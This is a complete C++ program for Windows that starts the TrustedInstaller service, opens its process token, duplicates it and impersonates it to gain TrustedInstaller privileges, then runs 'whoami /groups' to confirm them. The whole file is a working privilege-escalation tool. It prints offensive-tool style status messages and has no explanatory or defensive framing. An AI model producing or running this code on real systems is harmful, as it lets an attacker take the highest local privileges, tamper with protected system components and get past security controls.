#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>

DWORD GetProcessIdByName(const std::wstring& processName)
{
    PROCESSENTRY32W entry;
    entry.dwSize = sizeof(entry);
    DWORD pid = 0;

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Process32FirstW(snapshot, &entry))
    {
        do
        {
            if (_wcsicmp(entry.szExeFile, processName.c_str()) == 0)
            {
                pid = entry.th32ProcessID;
                break;
            }
        } while (Process32NextW(snapshot, &entry));
    }
    CloseHandle(snapshot);
    return pid;
}

bool StartTrustedInstallerService()
{
    SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!scm) return false;

    SC_HANDLE service = OpenServiceW(scm, L"TrustedInstaller", SERVICE_START | SERVICE_QUERY_STATUS);
    if (!service)
    {
        CloseServiceHandle(scm);
        return false;
    }
    SERVICE_STATUS_PROCESS ssp = { 0 };
    DWORD bytesNeeded;

    // Try to start service
    StartServiceW(service, 0, NULL);

    // Wait for service starting
    do
    {
        QueryServiceStatusEx(service, SC_STATUS_PROCESS_INFO,
            reinterpret_cast<LPBYTE>(&ssp), sizeof(ssp), &bytesNeeded);
        Sleep(500);
    } while (ssp.dwCurrentState == SERVICE_START_PENDING);

    CloseServiceHandle(service);
    CloseServiceHandle(scm);

    return (ssp.dwCurrentState == SERVICE_RUNNING);
}

bool ImpersonateTrustedInstaller()
{
    if (!StartTrustedInstallerService())
    {
        std::wcerr << L"Failed to start TrustedInstaller service\n";
        return false;
    }

    DWORD pid = GetProcessIdByName(L"TrustedInstaller.exe");
    if (!pid)
    {
        std::wcerr << L"TrustedInstaller process not found\n";
        return false;
    }

    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProc)
    {
        std::wcerr << L"Failed to open TrustedInstaller process\n";
        return false;
    }

    HANDLE hToken;
    if (!OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken))
    {
        std::wcerr << L"Failed to open process token\n";
        CloseHandle(hProc);
        return false;
    }

    HANDLE hDupToken;
    if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hDupToken))
    {
        std::wcerr << L"Failed to duplicate token\n";
        CloseHandle(hToken);
        CloseHandle(hProc);
        return false;
    }

    if (!ImpersonateLoggedOnUser(hDupToken))
    {
        std::wcerr << L"Failed to impersonate token\n";
        CloseHandle(hDupToken);
        CloseHandle(hToken);
        CloseHandle(hProc);
        return false;
    }

    std::wcout << L"[*] Successfully impersonated TrustedInstaller\n";

    CloseHandle(hDupToken);
    CloseHandle(hToken);
    CloseHandle(hProc);
    return true;
}

int main()
{
    if (ImpersonateTrustedInstaller())
    {
        // TrustedInstaller Access
        system("whoami /groups");
    }
    else
    {
        std::wcerr << L"Impersonation failed.\n";
    }

    return 0;
}
